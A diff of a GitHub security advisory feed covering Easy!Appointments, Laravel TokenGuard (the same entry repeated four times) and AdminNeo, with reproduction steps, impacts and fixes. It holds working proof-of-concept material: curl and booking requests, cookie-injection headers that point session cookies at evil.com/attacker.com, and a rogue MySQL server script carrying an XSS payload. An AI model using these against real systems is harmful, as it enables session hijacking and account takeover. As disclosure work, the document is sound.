+<li><p>The attacker copies the <code>ea_session</code> cookie from <code>$ATTACKER_JAR</code> into a real browser, opens the redirect URL, signs in to Google with their own Google account, and grants consent. Google redirects back to <code>http://localhost/index.php/google/oauth_callback?code=...</code> and the app exchanges the code for an access + refresh token.</p>
+</li>
+<li><p>Confirm the row was rebound. The token, sync flag, and calendar selection now belong to the attacker's Google account but sit on the victim's <code>ea_user_settings</code>:</p>
+<pre><code class="language-bash">docker compose exec -T mysql mysql -uuser -ppassword easyappointments \
+  -e "SELECT name, value FROM ea_user_settings WHERE id_users=$VICTIM_ID AND name IN ('google_sync','google_token','google_calendar')"
+</code></pre>
+<p>Expected: <code>google_sync = 1</code>, <code>google_token = {"access_token":"...","refresh_token":"..."}</code> (attacker's), <code>google_calendar = primary</code>.</p>
+</li>
+<li><p>Trigger a sync. Any unauthenticated booking against the victim provider now lands in the attacker's calendar:</p>
+<pre><code class="language-bash">CSRF=$(awk '$6=="csrf_cookie"{print $7}' /tmp/booking.cookies)
+curl -s -c /tmp/booking.cookies http://localhost/ -o /dev/null
+CSRF=$(awk '$6=="csrf_cookie"{print $7}' /tmp/booking.cookies)
+curl -s -b /tmp/booking.cookies -X POST http://localhost/index.php/booking/register \
+  --data-urlencode "csrf_token=$CSRF" \
+  --data-urlencode "post_data[manage_mode]=false" \
+  --data-urlencode "post_data[appointment][id_users_provider]=$VICTIM_ID" \
+  --data-urlencode "post_data[appointment][id_services]=1" \
+  --data-urlencode "post_data[appointment][start_datetime]=2026-06-01 10:00:00" \
+  --data-urlencode "post_data[appointment][end_datetime]=2026-06-01 10:30:00" \
+  --data-urlencode "post_data[customer][first_name]=Carol" \
+  --data-urlencode "post_data[customer][last_name]=Victim" \
+  --data-urlencode "post_data[customer][email]=carol@target.test"
+</code></pre>
+<p>Expected: the attacker's Google calendar receives a new event whose title is the service name, with <code>Carol Victim &lt;carol@target.test&gt;</code> listed as an attendee.</p>
+</li>
+</ol>
+<h3 id="impact">Impact</h3>
+<ul>
+<li><strong>Confidentiality:</strong> Reads every appointment booked against the victim provider; the customer's first name, last name, and email attach to each Google calendar event as attendee data (<code>Google_sync.php:184-189</code>).</li>
+<li><strong>Integrity:</strong> Deletes any of the victim provider's appointments by removing the matching event from the attacker's calendar; the next <code>Console::sync</code> removes the local row (<code>Google.php:186-191</code>).</li>
+<li><strong>Integrity:</strong> Inserts arbitrary unavailability records onto the victim provider's schedule by creating events in the attacker's calendar (<code>Google.php:209-254</code>).</li>
+</ul>
+<h3 id="suggestions-to-fix">Suggestions to fix</h3>
+<blockquote>
+<p><em>This has not been tested - it is illustrative only.</em></p>
+</blockquote>
+<p>Reject the call unless the caller is an admin or the provider whose row is about to be rewritten - the same gate <code>select_google_calendar</code> and <code>disable_provider_sync</code> already use.</p>
+<pre><code class="language-diff"> public function oauth(string $provider_id): void
+ {
+     if (!$this-&gt;session-&gt;userdata('user_id')) {
+         show_error('Forbidden', 403);
+     }
+
++    if (cannot('edit', PRIV_USERS) &amp;&amp; (int) session('user_id') !== (int) $provider_id) {
++        abort(403, 'Forbidden');
++    }
++
+     // Store the provider id for use on the callback function.
+     session(['oauth_provider_id' =&gt; $provider_id]);
+
+     // Redirect browser to google user content page.
+     header('Location: ' . $this-&gt;google_sync-&gt;get_auth_url());
+ }
+</code></pre>
+<h3 id="credit">Credit</h3>
+<p>Dredsen, 2026.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/alextselegidis/easyappointments/security/advisories/GHSA-8hm4-r66f-29wr">https://github.com/alextselegidis/easyappointments/security/advisories/GHSA-8hm4-r66f-29wr</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-52841">https://nvd.nist.gov/vuln/detail/CVE-2026-52841</a></li>
+<li><a href="https://github.com/alextselegidis/easyappointments/commit/4b2d245d2cd2058dc76e05f6eb65b26699268471">https://github.com/alextselegidis/easyappointments/commit/4b2d245d2cd2058dc76e05f6eb65b26699268471</a></li>
+<li><a href="https://github.com/alextselegidis/easyappointments/releases/tag/1.6.0">https://github.com/alextselegidis/easyappointments/releases/tag/1.6.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-8hm4-r66f-29wr">https://github.com/advisories/GHSA-8hm4-r66f-29wr</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-8hm4-r66f-29wr</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-07-29T16:29:26.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[laravel/framework] Laravel TokenGuard authentication bypass through non-string API credentials]]></title>
+        <id>https://github.com/advisories/GHSA-f9x3-7vq9-cph6</id>
+        <link href="https://github.com/advisories/GHSA-f9x3-7vq9-cph6"/>
+        <updated>2026-11-10T19:03:14.000Z</updated>
+        <content type="html"><![CDATA[<p>Laravel's built-in TokenGuard, <strong>when configured with a standard token-based API guard</strong>, may be bypassed to authenticate as an arbitrary existing user without knowledge of their valid API token. </p>
+<p><strong>Under certain database configurations (MySQL/MariaDB)</strong> an attacker can submit a specially crafted, non-string credential value that is mishandled during the authentication lookup, causing the underlying query to match an unintended user record rather than failing authentication as expected.</p>
+<h3 id="impact">Impact</h3>
+<p>An unauthenticated attacker may authenticate as another user without possessing that user's API token, leading to authentication bypass and account takeover on any route protected by the affected guard.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/laravel/framework/security/advisories/GHSA-f9x3-7vq9-cph6">https://github.com/laravel/framework/security/advisories/GHSA-f9x3-7vq9-cph6</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-114509">https://nvd.nist.gov/vuln/detail/CVE-2026-114509</a></li>
+<li><a href="https://github.com/laravel/framework/commit/8dbb08bccac1be095dba4a9d259a419620f1e8a5">https://github.com/laravel/framework/commit/8dbb08bccac1be095dba4a9d259a419620f1e8a5</a></li>
+<li><a href="https://github.com/laravel/framework/commit/9b21ce0a9bb2b2599978bc0b0df4abea952ad31c">https://github.com/laravel/framework/commit/9b21ce0a9bb2b2599978bc0b0df4abea952ad31c</a></li>
+<li><a href="https://github.com/laravel/framework/releases/tag/v12.68.0">https://github.com/laravel/framework/releases/tag/v12.68.0</a></li>
+<li><a href="https://github.com/laravel/framework/commit/47781ee0cc09940c2d706623160e14d7c6eb6b36">https://github.com/laravel/framework/commit/47781ee0cc09940c2d706623160e14d7c6eb6b36</a></li>
+<li><a href="https://github.com/laravel/framework/commit/5056ca53797eed9244749695c3bb3f015a38415c">https://github.com/laravel/framework/commit/5056ca53797eed9244749695c3bb3f015a38415c</a></li>
+<li><a href="https://github.com/laravel/framework/releases/tag/v10.50.4">https://github.com/laravel/framework/releases/tag/v10.50.4</a></li>
+<li><a href="https://github.com/laravel/framework/releases/tag/v11.56.1">https://github.com/laravel/framework/releases/tag/v11.56.1</a></li>
+<li><a href="https://github.com/laravel/framework/releases/tag/v13.27.0">https://github.com/laravel/framework/releases/tag/v13.27.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-f9x3-7vq9-cph6">https://github.com/advisories/GHSA-f9x3-7vq9-cph6</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-f9x3-7vq9-cph6</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-10-23T21:50:27.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[laravel/framework] Laravel TokenGuard authentication bypass through non-string API credentials]]></title>
+        <id>https://github.com/advisories/GHSA-f9x3-7vq9-cph6</id>
+        <link href="https://github.com/advisories/GHSA-f9x3-7vq9-cph6"/>
+        <updated>2026-11-10T19:03:14.000Z</updated>
+        <content type="html"><![CDATA[<p>Laravel's built-in TokenGuard, <strong>when configured with a standard token-based API guard</strong>, may be bypassed to authenticate as an arbitrary existing user without knowledge of their valid API token. </p>
+<p><strong>Under certain database configurations (MySQL/MariaDB)</strong> an attacker can submit a specially crafted, non-string credential value that is mishandled during the authentication lookup, causing the underlying query to match an unintended user record rather than failing authentication as expected.</p>
+<h3 id="impact">Impact</h3>
+<p>An unauthenticated attacker may authenticate as another user without possessing that user's API token, leading to authentication bypass and account takeover on any route protected by the affected guard.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/laravel/framework/security/advisories/GHSA-f9x3-7vq9-cph6">https://github.com/laravel/framework/security/advisories/GHSA-f9x3-7vq9-cph6</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-114509">https://nvd.nist.gov/vuln/detail/CVE-2026-114509</a></li>
+<li><a href="https://github.com/laravel/framework/commit/8dbb08bccac1be095dba4a9d259a419620f1e8a5">https://github.com/laravel/framework/commit/8dbb08bccac1be095dba4a9d259a419620f1e8a5</a></li>
+<li><a href="https://github.com/laravel/framework/commit/9b21ce0a9bb2b2599978bc0b0df4abea952ad31c">https://github.com/laravel/framework/commit/9b21ce0a9bb2b2599978bc0b0df4abea952ad31c</a></li>
+<li><a href="https://github.com/laravel/framework/releases/tag/v12.68.0">https://github.com/laravel/framework/releases/tag/v12.68.0</a></li>
+<li><a href="https://github.com/laravel/framework/commit/47781ee0cc09940c2d706623160e14d7c6eb6b36">https://github.com/laravel/framework/commit/47781ee0cc09940c2d706623160e14d7c6eb6b36</a></li>
+<li><a href="https://github.com/laravel/framework/commit/5056ca53797eed9244749695c3bb3f015a38415c">https://github.com/laravel/framework/commit/5056ca53797eed9244749695c3bb3f015a38415c</a></li>
+<li><a href="https://github.com/laravel/framework/releases/tag/v10.50.4">https://github.com/laravel/framework/releases/tag/v10.50.4</a></li>
+<li><a href="https://github.com/laravel/framework/releases/tag/v11.56.1">https://github.com/laravel/framework/releases/tag/v11.56.1</a></li>
+<li><a href="https://github.com/laravel/framework/releases/tag/v13.27.0">https://github.com/laravel/framework/releases/tag/v13.27.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-f9x3-7vq9-cph6">https://github.com/advisories/GHSA-f9x3-7vq9-cph6</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-f9x3-7vq9-cph6</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-10-23T21:50:27.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[laravel/framework] Laravel TokenGuard authentication bypass through non-string API credentials]]></title>
+        <id>https://github.com/advisories/GHSA-f9x3-7vq9-cph6</id>
+        <link href="https://github.com/advisories/GHSA-f9x3-7vq9-cph6"/>
+        <updated>2026-11-10T19:03:14.000Z</updated>
+        <content type="html"><![CDATA[<p>Laravel's built-in TokenGuard, <strong>when configured with a standard token-based API guard</strong>, may be bypassed to authenticate as an arbitrary existing user without knowledge of their valid API token. </p>
+<p><strong>Under certain database configurations (MySQL/MariaDB)</strong> an attacker can submit a specially crafted, non-string credential value that is mishandled during the authentication lookup, causing the underlying query to match an unintended user record rather than failing authentication as expected.</p>
+<h3 id="impact">Impact</h3>
+<p>An unauthenticated attacker may authenticate as another user without possessing that user's API token, leading to authentication bypass and account takeover on any route protected by the affected guard.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/laravel/framework/security/advisories/GHSA-f9x3-7vq9-cph6">https://github.com/laravel/framework/security/advisories/GHSA-f9x3-7vq9-cph6</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-114509">https://nvd.nist.gov/vuln/detail/CVE-2026-114509</a></li>
+<li><a href="https://github.com/laravel/framework/commit/8dbb08bccac1be095dba4a9d259a419620f1e8a5">https://github.com/laravel/framework/commit/8dbb08bccac1be095dba4a9d259a419620f1e8a5</a></li>
+<li><a href="https://github.com/laravel/framework/commit/9b21ce0a9bb2b2599978bc0b0df4abea952ad31c">https://github.com/laravel/framework/commit/9b21ce0a9bb2b2599978bc0b0df4abea952ad31c</a></li>
+<li><a href="https://github.com/laravel/framework/releases/tag/v12.68.0">https://github.com/laravel/framework/releases/tag/v12.68.0</a></li>
+<li><a href="https://github.com/laravel/framework/commit/47781ee0cc09940c2d706623160e14d7c6eb6b36">https://github.com/laravel/framework/commit/47781ee0cc09940c2d706623160e14d7c6eb6b36</a></li>
+<li><a href="https://github.com/laravel/framework/commit/5056ca53797eed9244749695c3bb3f015a38415c">https://github.com/laravel/framework/commit/5056ca53797eed9244749695c3bb3f015a38415c</a></li>
+<li><a href="https://github.com/laravel/framework/releases/tag/v10.50.4">https://github.com/laravel/framework/releases/tag/v10.50.4</a></li>
+<li><a href="https://github.com/laravel/framework/releases/tag/v11.56.1">https://github.com/laravel/framework/releases/tag/v11.56.1</a></li>
+<li><a href="https://github.com/laravel/framework/releases/tag/v13.27.0">https://github.com/laravel/framework/releases/tag/v13.27.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-f9x3-7vq9-cph6">https://github.com/advisories/GHSA-f9x3-7vq9-cph6</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-f9x3-7vq9-cph6</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-10-23T21:50:27.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[laravel/framework] Laravel TokenGuard authentication bypass through non-string API credentials]]></title>
+        <id>https://github.com/advisories/GHSA-f9x3-7vq9-cph6</id>
+        <link href="https://github.com/advisories/GHSA-f9x3-7vq9-cph6"/>
+        <updated>2026-11-10T19:03:14.000Z</updated>
+        <content type="html"><![CDATA[<p>Laravel's built-in TokenGuard, <strong>when configured with a standard token-based API guard</strong>, may be bypassed to authenticate as an arbitrary existing user without knowledge of their valid API token. </p>
+<p><strong>Under certain database configurations (MySQL/MariaDB)</strong> an attacker can submit a specially crafted, non-string credential value that is mishandled during the authentication lookup, causing the underlying query to match an unintended user record rather than failing authentication as expected.</p>
+<h3 id="impact">Impact</h3>
+<p>An unauthenticated attacker may authenticate as another user without possessing that user's API token, leading to authentication bypass and account takeover on any route protected by the affected guard.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/laravel/framework/security/advisories/GHSA-f9x3-7vq9-cph6">https://github.com/laravel/framework/security/advisories/GHSA-f9x3-7vq9-cph6</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-114509">https://nvd.nist.gov/vuln/detail/CVE-2026-114509</a></li>
+<li><a href="https://github.com/laravel/framework/commit/8dbb08bccac1be095dba4a9d259a419620f1e8a5">https://github.com/laravel/framework/commit/8dbb08bccac1be095dba4a9d259a419620f1e8a5</a></li>
+<li><a href="https://github.com/laravel/framework/commit/9b21ce0a9bb2b2599978bc0b0df4abea952ad31c">https://github.com/laravel/framework/commit/9b21ce0a9bb2b2599978bc0b0df4abea952ad31c</a></li>
+<li><a href="https://github.com/laravel/framework/releases/tag/v12.68.0">https://github.com/laravel/framework/releases/tag/v12.68.0</a></li>
+<li><a href="https://github.com/laravel/framework/commit/47781ee0cc09940c2d706623160e14d7c6eb6b36">https://github.com/laravel/framework/commit/47781ee0cc09940c2d706623160e14d7c6eb6b36</a></li>
+<li><a href="https://github.com/laravel/framework/commit/5056ca53797eed9244749695c3bb3f015a38415c">https://github.com/laravel/framework/commit/5056ca53797eed9244749695c3bb3f015a38415c</a></li>
+<li><a href="https://github.com/laravel/framework/releases/tag/v10.50.4">https://github.com/laravel/framework/releases/tag/v10.50.4</a></li>
+<li><a href="https://github.com/laravel/framework/releases/tag/v11.56.1">https://github.com/laravel/framework/releases/tag/v11.56.1</a></li>
+<li><a href="https://github.com/laravel/framework/releases/tag/v13.27.0">https://github.com/laravel/framework/releases/tag/v13.27.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-f9x3-7vq9-cph6">https://github.com/advisories/GHSA-f9x3-7vq9-cph6</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-f9x3-7vq9-cph6</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-10-23T21:50:27.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[filegator/filegator] FileGator: Missing authorization in POST /upload allows cross-user read and deletion of temporary files]]></title>
         <id>https://github.com/advisories/GHSA-44r8-3p76-84mw</id>
@@ -1366,627 +1955,5 @@ db[]=/var/www/html/poc-delete-target.txt&amp;all=&amp;drop=Drop&amp;token=&lt;li
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-10-30T22:52:58.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[adminneo-org/adminneo] AdminNeo has Cookie Attribute Injection via Unsanitized X-Forwarded-Prefix in Set-Cookie Headers]]></title>
-        <id>https://github.com/advisories/GHSA-79wv-8rh2-9vp2</id>
-        <link href="https://github.com/advisories/GHSA-79wv-8rh2-9vp2"/>
-        <updated>2026-10-30T22:52:48.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>AdminNeo versions 4.6.0 through at least 5.5.0 are vulnerable to cookie attribute injection via the <code>X-Forwarded-Prefix</code> HTTP header. An attacker who can influence this header (e.g., through a reverse proxy that forwards it from clients, an attacker-controlled upstream proxy, or a man-in-the-middle position) can inject arbitrary cookie attributes including <code>Domain</code>, <code>Path</code>, <code>Secure</code>, and <code>SameSite</code> into all <code>Set-Cookie</code> response headers emitted by AdminNeo.</p>
-<p>This allows an attacker to expand the cookie scope to an attacker-controlled domain (e.g., <code>Domain=.evil.com</code>), causing the victim's browser to send AdminNeo's <code>neo_sid</code> (session ID) and <code>neo_key</code> (database password encryption key) cookies to the attacker's server on subsequent requests.</p>
-<p>Originally reported by @retkoussa in Adminer: <a href="https://github.com/vrana/adminer/security/advisories/GHSA-c533-9qwm-8w5h">https://github.com/vrana/adminer/security/advisories/GHSA-c533-9qwm-8w5h</a></p>
-<h3 id="vulnerable-code">Vulnerable Code</h3>
-<p><strong>Root cause 1 - Unsanitized header prepended to <code>REQUEST_URI</code></strong>
-(<code>admin/include/bootstrap.inc.php</code>, lines 50–52):</p>
-<pre><code class="language-php">if ($_SERVER["HTTP_X_FORWARDED_PREFIX"]) {
-    $_SERVER["REQUEST_URI"] = $_SERVER["HTTP_X_FORWARDED_PREFIX"] . $_SERVER["REQUEST_URI"];
-}
-</code></pre>
-<p>The client-supplied <code>X-Forwarded-Prefix</code> header is concatenated into <code>REQUEST_URI</code> with no validation or sanitization of special characters (specifically semicolons, which delimit cookie attributes).</p>
-<p><strong>Root cause 2 - Manual <code>Set-Cookie </code>header construction without escaping</strong>
-(<code>admin/include/functions.inc.php</code>, lines 416–424):</p>
-<pre><code class="language-php">function cookie(string $name, string $value, int $lifetime = 2592000): void
-{
-    header("Set-Cookie: $name=" . rawurlencode($value)
-        . ($lifetime ? "; expires=" . gmdate("D, d M Y H:i:s", time() + $lifetime) . " GMT" : "")
-        . "; path=" . preg_replace('~\?.*~', '', $_SERVER["REQUEST_URI"])
-        . (HTTPS ? "; secure" : "")
-        . "; HttpOnly; SameSite=lax",
-        false);
-}
-</code></pre>
-<p>The tainted <code>REQUEST_URI</code> is interpolated directly into the <code>path=</code> attribute of the <code>Set-Cookie</code> header. Since semicolons are not stripped or escaped, any <code>;</code>-separated directives injected via <code>X-Forwarded-Prefix</code> become valid cookie attributes parsed by the browser.</p>
-<p><strong>Root cause 3 - Session cookie also tainted</strong>
-(<code>admin/include/bootstrap.inc.php</code>, line 61):</p>
-<pre><code class="language-php">session_set_cookie_params(0, preg_replace('~\?.*~', '', $_SERVER["REQUEST_URI"]), "", HTTPS, true);
-</code></pre>
-<p>The PHP session cookie (<code>neo_sid</code>) path is similarly derived from the tainted <code>REQUEST_URI</code>, extending the same vulnerability to the session cookie set by PHP itself.</p>
-<h3 id="impact">Impact</h3>
-<ul>
-<li><strong>Session hijacking:</strong> The <code>neo_sid</code> session cookie is sent to the attacker's domain, allowing full session takeover.</li>
-<li><strong>Credential theft:</strong> The <code>neo_key</code> cookie contains the key used to encrypt/decrypt database passwords stored in the session. With this key, an attacker can decrypt saved database credentials.</li>
-<li><strong>Session fixation:</strong> An attacker can inject arbitrary <code>Path</code>, <code>SameSite</code>, and <code>Secure</code> attributes, manipulating cookie behavior.</li>
-<li><strong>Wide applicability:</strong> The <code>X-Forwarded-Prefix</code> header was specifically added to support reverse proxy deployments (Traefik <code>PathPrefixStrip</code>, nginx, HAProxy). These are the exact environments where this header is forwarded from clients, making the vulnerability relevant in the deployments it was designed for.</li>
-</ul>
-<h3 id="affected-cookies">Affected Cookies</h3>
-<p>|<strong>Cookie</strong>|<strong>Content</strong>|<strong>Risk</strong>|
-|<code>neo_sid</code>|PHP session ID|Session hijacking|
-|<code>neo_key</code>|Encryption key for stored DB passwords|Credential theft|
-|<code>neo_settings</code>|User preferences|Low (information disclosure)|</p>
-<h3 id="proof-of-concept">Proof of Concept</h3>
-<pre><code class="language-shell"># Normal request with clean Set-Cookie headerss:
-curl -sI http://localhost:8080/adminneo/index.php | grep -i set-cookie
-&gt; Response: Set-Cookie: neo_key=...; path=/adminneo/index.php; HttpOnly; SameSite=lax
-
-# Malicious request — inject Domain=.evil.com:
-curl -sI -H "X-Forwarded-Prefix: /adminneo; Domain=.evil.com" \
-  http://localhost:8080/adminneo/index.php | grep -i set-cookie
-&gt; Response: Set-Cookie: neo_key=...; path=/adminneo; Domain=.evil.com/adminneo/index.php; HttpOnly; SameSite=lax
-#                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^ INJECTED
-
-# Full attribute override - inject Domain + SameSite=None:
-curl -sI -H "X-Forwarded-Prefix: /; Path=/; Domain=.attacker.com; SameSite=None" \
-  http://localhost:8080/adminneo/index.php | grep -i set-cookie
-&gt; Response Set-Cookie: neo_key=...; path=/; Path=/; Domain=.attacker.com; SameSite=None/adminneo/index.php; ...
-</code></pre>
-<h3 id="recommended-fix">Recommended Fix</h3>
-<ol>
-<li><strong>Sanitize <code>X-Forwarded-Prefix</code>:</strong> Strip or reject semicolons, newlines, and other HTTP header metacharacters from the <code>X-Forwarded-Prefix</code> value before using it.</li>
-<li><strong>Use <code>setcookie()</code> / <code>setrawcookie()</code>:</strong> Replace the manual <code>header("Set-Cookie: ...")</code> construction in <code>cookie()</code> with PHP's built-in <code>setcookie()</code> function, which properly escapes attribute values.</li>
-<li><strong>Validate <code>REQUEST_URI</code> before cookie use:</strong> After any prefix manipulation, strip characters that are invalid in a cookie <code>path</code> attribute (<code>;</code>, <code>,</code>, whitespace per RFC 6265).</li>
-</ol>
-<pre><code class="language-php">// Example fix for bootstrap.inc.php:
-if ($_SERVER["HTTP_X_FORWARDED_PREFIX"]) {
-    $prefix = preg_replace('~[;\r\n].*~', '', $_SERVER["HTTP_X_FORWARDED_PREFIX"]);
-    $_SERVER["REQUEST_URI"] = $prefix . $_SERVER["REQUEST_URI"];
-}
-</code></pre>
-<h3 id="server-based-workaround-via-config">Server Based Workaround Via Config</h3>
-<p>Configure the reverse proxy to set <code>X-Forwarded-Prefix</code> to a static, trusted value rather than forwarding the client-supplied header:</p>
-<pre><code class="language-nginx"># nginx — secure configuration:
-fastcgi_param HTTP_X_FORWARDED_PREFIX /adminneo;  # static value, not $http_x_forwarded_prefix
-</code></pre>
-<pre><code class="language-yaml"># Traefik, use middleware instead of client headers:
-middlewares:
-  strip-prefix:
-    stripPrefix:
-      prefixes:
-        - "/adminneo"
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/adminneo-org/adminneo/security/advisories/GHSA-79wv-8rh2-9vp2">https://github.com/adminneo-org/adminneo/security/advisories/GHSA-79wv-8rh2-9vp2</a></li>
-<li><a href="https://github.com/adminneo-org/adminneo/commit/aa6f2544a8a65cf5e8317f1a902f74181e136d64">https://github.com/adminneo-org/adminneo/commit/aa6f2544a8a65cf5e8317f1a902f74181e136d64</a></li>
-<li><a href="https://github.com/adminneo-org/adminneo/releases/tag/v5.5.1">https://github.com/adminneo-org/adminneo/releases/tag/v5.5.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-79wv-8rh2-9vp2">https://github.com/advisories/GHSA-79wv-8rh2-9vp2</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-79wv-8rh2-9vp2</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-10-30T22:52:47.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[adminneo-org/adminneo] AdminNeo Vulnerable to XSS via Rogue MySQL Server Version String (CSP Nonce Bypass)]]></title>
-        <id>https://github.com/advisories/GHSA-rx7m-wxwq-vxr9</id>
-        <link href="https://github.com/advisories/GHSA-rx7m-wxwq-vxr9"/>
-        <updated>2026-10-30T22:52:23.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>AdminNeo inserts the database server's version string into a <code>&lt;script&gt;</code> tag that carries a valid CSP nonce, without any sanitization. A rogue database server can return a crafted version string that breaks out of the JavaScript context and executes arbitrary code. Because the script tag already has a valid nonce, the browser's Content Security Policy does not block execution. No authentication is required when combined with Login CSRF.</p>
-<p>Originally reported in Adminer: <a href="https://github.com/vrana/adminer/security/advisories/GHSA-h6jr-7pr6-grgj">https://github.com/vrana/adminer/security/advisories/GHSA-h6jr-7pr6-grgj</a></p>
-<h2 id="prerequisites">Prerequisites</h2>
-<ul>
-<li>Target runs AdminNeo</li>
-<li>Attacker controls a reachable MySQL server (a 80-line Python script)</li>
-</ul>
-<h2 id="root-cause">Root Cause</h2>
-<p><code>admin/core/Admin.php</code>, lines 1285-1286:</p>
-<pre><code class="language-php">echo script("let autocompletion;\nwindow.addEventListener('DOMContentLoaded', () =&gt; { initSyntaxHighlighting('" .
-    Connection::get()-&gt;getVersion() . "', '" . Connection::get()-&gt;getFlavor() . "', autocompletion); });");
-</code></pre>
-<p><code>script()</code> wraps the output in <code>&lt;script nonce="VALID_NONCE"&gt;</code>. Return value of <code>Connection::get()-&gt;getVersion()</code> is not escaped.</p>
-<h2 id="steps-to-reproduce">Steps To Reproduce</h2>
-<h3 id="1-build-the-environment">1. Build the environment</h3>
-<p><strong>Dockerfile</strong> (AdminNeo):</p>
-<pre><code class="language-dockerfile">FROM php:8.3-cli
-COPY adminneo.php /var/www/adminneo.php
-WORKDIR /var/www
-EXPOSE 8081
-CMD ["php", "-S", "0.0.0.0:8081"]
-</code></pre>
-<p><strong>rogue_mysql.py</strong> (fake MySQL server that accepts any login):</p>
-<pre><code class="language-python">import socket, struct, threading
-
-PAYLOAD = "1');alert(origin)//"
-
-# Capability flags the client expects
-CAP_PROTOCOL_41     = 0x0200
-CAP_SECURE_CONNECTION = 0x8000
-CAP_PLUGIN_AUTH     = 0x00080000
-CAPS_LOW  = CAP_PROTOCOL_41 | CAP_SECURE_CONNECTION
-CAPS_HIGH = (CAP_PLUGIN_AUTH &gt;&gt; 16)
-
-def make_packet(seq, payload):
-    length = struct.pack("&lt;I", len(payload))[:3]
-    return length + bytes([seq]) + payload
-
-def make_greeting(version_str):
-    pkt  = b"\x0a"                                  # protocol version 10
-    pkt += version_str.encode() + b"\x00"            # version string
-    pkt += struct.pack("&lt;I", 1)                      # connection id
-    pkt += b"\x41" * 8                               # auth plugin data part 1
-    pkt += b"\x00"                                   # filler
-    pkt += struct.pack("&lt;H", CAPS_LOW)               # capability flags lower
-    pkt += b"\x21"                                   # charset utf8
-    pkt += struct.pack("&lt;H", 0x0002)                 # status flags
-    pkt += struct.pack("&lt;H", CAPS_HIGH)              # capability flags upper
-    pkt += b"\x15"                                   # auth data length (21)
-    pkt += b"\x00" * 10                              # reserved
-    pkt += b"\x41" * 12 + b"\x00"                    # auth plugin data part 2
-    pkt += b"mysql_native_password\x00"              # auth plugin name
-    return make_packet(0, pkt)
-
-def make_ok(seq):
-    pkt  = b"\x00"          # OK marker
-    pkt += b"\x00"          # affected rows
-    pkt += b"\x00"          # last insert id
-    pkt += struct.pack("&lt;H", 0x0002)  # status flags
-    pkt += struct.pack("&lt;H", 0)       # warnings
-    return make_packet(seq, pkt)
-
-def make_eof(seq):
-    pkt  = b"\xfe"
-    pkt += struct.pack("&lt;H", 0)       # warnings
-    pkt += struct.pack("&lt;H", 0x0002)  # status flags
-    return make_packet(seq, pkt)
-
-def make_err(seq, msg=b"not supported"):
-    pkt  = b"\xff"
-    pkt += struct.pack("&lt;H", 1045)
-    pkt += b"#HY000"
-    pkt += msg
-    return make_packet(seq, pkt)
-
-def handle(conn):
-    conn.sendall(make_greeting(PAYLOAD))
-    try:
-        conn.recv(4096)     # client login request
-    except Exception:
-        conn.close()
-        return
-    conn.sendall(make_ok(2))  # accept login
-
-    # Answer any queries Adminer sends after login
-    while True:
-        try:
-            data = conn.recv(4096)
-            if not data:
-                break
-            seq = data[3] + 1
-            # Send ERR for all queries (Adminer still has the version in memory)
-            conn.sendall(make_err(seq))
-        except Exception:
-            break
-    conn.close()
-
-srv = socket.socket()
-srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-srv.bind(("0.0.0.0", 3307))
-srv.listen(5)
-print("[*] Rogue MySQL on :3307 - version: " + PAYLOAD)
-while True:
-    conn, addr = srv.accept()
-    print(f"[+] Connection from {addr}")
-    threading.Thread(target=handle, args=(conn,)).start()
-</code></pre>
-<pre><code class="language-shell"># Terminal 1: start Adminer
-docker build -t adminer-xss .
-docker run -d -p 8081:8081 --name adminer-xss adminer-xss
-
